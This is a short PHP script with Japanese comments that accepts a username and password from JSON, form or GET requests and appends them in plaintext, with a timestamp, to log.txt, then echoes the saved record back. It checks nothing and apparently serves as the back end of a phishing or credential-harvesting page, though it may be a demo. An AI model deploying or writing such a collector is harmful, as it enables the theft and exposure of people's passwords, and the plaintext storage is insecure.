<?php


function getCredentials(){
    $username = '';
    $password = '';

    // JSONリクエストの場合
    if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
        // JSONデータを受け取る
        $data = json_decode(file_get_contents("php://input"), true);
        if ($data !== null) {
            $username = htmlspecialchars($data['username'] ?? '', ENT_QUOTES, 'UTF-8');
            $password = htmlspecialchars($data['password'] ?? '', ENT_QUOTES, 'UTF-8');
        }
    }
    // フォームデータ（application/x-www-form-urlencoded または multipart/form-data）の場合
    elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
        $username = htmlspecialchars($_POST['username'] ?? '', ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($_POST['password'] ?? '', ENT_QUOTES, 'UTF-8');
    }
    // URLパラメータ（GETリクエスト）の場合
    elseif ($_SERVER["REQUEST_METHOD"] === "GET") {
        $username = htmlspecialchars($_GET['username'] ?? '', ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($_GET['password'] ?? '', ENT_QUOTES, 'UTF-8');
    }

    return [$username, $password];
}

// ユーザー名とパスワードを取得
list($username, $password) = getCredentials();
//echo "userid:$username\n";
// ログイン情報を保存するファイルのパス
$file = 'log.txt';

// タイムゾーンを日本時間（JST）に設定
date_default_timezone_set('Asia/Tokyo');
// 現在の日時を取得
$date = date('Y-m-d H:i:s');

$hr = str_repeat("-", 40);
// ログイン情報をフォーマット
$log = "【日時】$date\n【ユーザー名】$username\n【パスワード】$password\n$hr\n";

// ファイルに追記
file_put_contents($file, $log, FILE_APPEND);

echo "ログイン情報が保存されました。\n{$log}";


?>
<h1><?php /* echo  "⭐ログイン情報が保存されました。\n{$log}" */?></h1>
